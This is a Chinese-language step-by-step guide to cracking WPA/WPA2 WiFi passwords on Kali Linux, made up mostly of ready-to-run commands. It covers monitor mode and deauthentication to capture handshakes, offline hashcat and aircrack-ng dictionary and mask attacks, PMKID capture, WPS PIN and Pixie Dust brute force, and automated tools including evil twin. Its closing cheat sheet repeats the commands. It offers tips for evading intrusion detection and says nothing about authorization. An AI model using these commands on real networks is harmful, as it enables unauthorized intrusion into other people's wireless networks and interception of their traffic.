# Kali Linux 破解 WiFi（WPA/WPA2）实操指南

核心流程四步：

1. 网卡进入监听模式
2. 抓四次握手（EAPOL）或 PMKID
3. 离线跑字典
4. 得到明文密码

整条链路上唯一的"实时"环节是抓包，破解本身完全离线，不接触目标。

---

## 目录

- [一、硬件前提](#一硬件前提)
- [二、进入监听模式](#二进入监听模式)
- [三、扫描目标](#三扫描目标)
- [四、抓四次握手](#四抓四次握手eapol)
- [五、离线破解](#五离线破解)
- [六、PMKID 攻击](#六pmkid-攻击不需要客户端)
- [七、WPS 攻击](#七wps-攻击目标开了-wps-的话最快)
- [八、自动化工具](#八自动化工具)
- [九、WPA3 / PMF 的限制](#九wpa3--pmf-的限制)
- [十、提高成功率的细节](#十提高成功率的几个实际细节)
- [附录：完整命令速查](#附录完整命令速查)

---

## 一、硬件前提

网卡必须同时支持 **monitor mode（监听）** 和 **packet injection（注入）**。Kali 装在虚拟机里的话，要走 USB 直通，把网卡整块交给虚拟机。

常见可用芯片：

| 芯片 | 频段 | 代表型号 |
|---|---|---|
| Atheros AR9271 | 2.4G | TP-Link TL-WN722N **v1** |
| RTL8812AU | 2.4/5G | Alfa AWUS036ACH |
| MT7612U | 2.4/5G | Alfa AWUS036ACM |
| RTL8814AU | 2.4/5G | Alfa AWUS1900 |

笔记本自带的 Intel 网卡基本只能监听、不能注入，deauth 那一步会失败。

---

## 二、进入监听模式

```bash
# 看接口和芯片
iw dev
lsusb

# 杀掉会抢网卡的进程（NetworkManager、wpa_supplicant 等）
sudo airmon-ng check kill

# 开启监听模式
sudo airmon-ng start wlan0
# 新版本会打印出 wlan0mon；部分驱动保持原名 wlan0
iw dev          # 确认接口处于 monitor 状态
```

手动方式（airmon-ng 不认新驱动时用）：

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel 6
```

---

## 三、扫描目标

```bash
sudo airodump-ng wlan0mon
```

输出里重点看这几列：

| 字段 | 含义 |
|---|---|
| **BSSID** | 目标 AP 的 MAC |
| **CH** | 信道，后面抓包必须锁定 |
| **PWR** | 信号强度，越接近 0 越好（-40 优于 -80） |
| **ENC / CIPHER / AUTH** | 加密方式，认准 `WPA2 / CCMP / PSK` |
| **ESSID** | 网络名称 |
| **STATION**（下半屏） | 已连接的客户端及其 MAC |

按 `Ctrl+C` 停下，记下目标。

---

## 四、抓四次握手（EAPOL）

锁定目标信道和 BSSID 开始抓包：

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
```

保持这个窗口不动，另开一个终端做 **deauth**，把客户端踢下线，逼它重连时重新握手：

```bash
# -0 是 deauth 次数，-a 目标 AP，-c 指定客户端
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

不指定 `-c` 就是广播 deauth，踢所有客户端，动静大、容易被 WIDS 记录；指定客户端更隐蔽。

回到 airodump 窗口，右上角出现下面这行就说明抓到了：

```
WPA handshake: AA:BB:CC:DD:EE:FF
```

没有客户端在线（只有 AP 孤立）时，等不到握手，只能走第六节的 PMKID 或者放弃。

---

## 五、离线破解

### 方式 A：aircrack-ng（CPU，简单）

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

先验证握手包完整性：

```bash
aircrack-ng handshake-01.cap     # 看是否显示 "1 handshake"
```

### 方式 B：hashcat（GPU，快几十倍，推荐）

```bash
# 转成 hashcat 22000 格式
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# 字典攻击
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# 带规则（大幅提升命中率）
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码攻击：8 位数字
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

查进度按 `s`，恢复用 `--restore`。RTX 3060 量级跑 22000 大约 40–60 万 H/s，rockyou 几分钟跑完。

---

## 六、PMKID 攻击（不需要客户端）

这是现在最省事的方法：直接从 AP 的第一个 EAPOL 帧里取 PMKID，**不用等客户端、不用 deauth**，抓到一个包就能离线跑。

```bash
# hcxdumptool v6 语法
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# hcxdumptool v7 语法（输出参数改成了 -w）
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng
```

只针对某个 BSSID 时（v7）：

```bash
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng \
  --filterlist_ap=aa:bb:cc:dd:ee:ff --filtermode=2
```

转换并破解：

```bash
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

不是所有 AP 都吐 PMKID——老固件、部分厂商默认关闭。抓不到就退回四次握手。

---

## 七、WPS 攻击（目标开了 WPS 的话最快）

```bash
# 扫描开启 WPS 的 AP
sudo wash -i wlan0mon

# 传统 PIN 爆破（慢，可能几小时）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust（对某些芯片是秒出）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

Pixie Dust 只对特定 Ralink/Realtek/部分 Broadcom 有效，成功率看 AP 型号。

---

## 八、自动化工具

手工流程熟练之后，日常用封装好的：

```bash
sudo wifite                 # 全自动：扫描→选目标→抓包→破解
sudo wifite --wps --kill    # 优先打 WPS
sudo airgeddon              # 交互式菜单，功能更全（含 evil twin）
```

---

## 九、WPA3 / PMF 的限制

- 目标开了 **802.11w（PMF，管理帧保护）**，deauth 会被 AP 直接丢弃，踢不下客户端。这时只能等自然重连，或改用 PMKID，或做 evil twin 钓鱼。
- **WPA3-SAE** 的握手是 PAKE，抓到的包不是四次握手，`hashcat -m 22000` 跑不了。SAE 的离线字典攻击需要专门的工具链，实际成功率远低于 WPA2。
- **WPA3 过渡模式（WPA2/WPA3 mixed）** 可以降级攻击：伪造只支持 WPA2 的 AP 让客户端回落，再抓 WPA2 握手。
- 企业级 **WPA-Enterprise（802.1X）** 不适用上面的字典攻击，方向是伪造 RADIUS 抓 MSCHAPv2 凭据再离线爆破。

---

## 十、提高成功率的几个实际细节

1. **距离和天线**：-70 dBm 以下丢包严重，握手包经常残缺。用定向天线（Yagi/平板）比换网卡有效。
2. **锁定信道**：`airodump-ng` 不锁 `-c` 会跳信道，抓不全 EAPOL 的四帧。
3. **deauth 次数**：10 次足够，太多会把客户端搞到不重连。iOS 设备有时需要等它自己重连。
4. **客户端 MAC 随机化**：新系统扫描时用随机 MAC，但连上 AP 后用的是真实 MAC，所以下半屏 STATION 里看到的是可用的。
5. **字典决定一切**：抓包只花五分钟，剩下全靠字典质量。国内场景加一份手机号、生日、拼音+年份的组合字典，命中率远高于裸 rockyou。
6. **握手包残缺**：`hcxpcapngtool` 会提示缺了哪几帧。缺 Message 2 或 3 时，重新 deauth 再抓一次，不要拿坏包去跑。
7. **5GHz 目标**：`airodump-ng` 默认只扫 2.4G，要加 `--band a`；网卡也得支持 5G。

---

## 附录：完整命令速查

```bash
# --- 环境准备 ---
iw dev
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# --- 扫描 ---
sudo airodump-ng wlan0mon
sudo airodump-ng --band a wlan0mon            # 扫 5GHz

# --- 抓握手 ---
sudo airodump-ng -c 6 --bssid <AP_MAC> -w handshake wlan0mon
sudo aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon

# --- 验证握手 ---
aircrack-ng handshake-01.cap

# --- CPU 破解 ---
aircrack-ng -w rockyou.txt -b <AP_MAC> handshake-01.cap

# --- GPU 破解 ---
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule

# --- PMKID ---
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt

# --- WPS ---
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b <AP_MAC> -K 1 -vv

# --- 自动化 ---
sudo wifite --wps --kill
sudo airgeddon

# --- 收尾：恢复托管模式 ---
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

### 常用字典位置

```
/usr/share/wordlists/rockyou.txt          # Kali 自带，需 gunzip 解压
/usr/share/seclists/                      # 更全的列表集合
/usr/share/hashcat/rules/best64.rule      # 规则文件
```
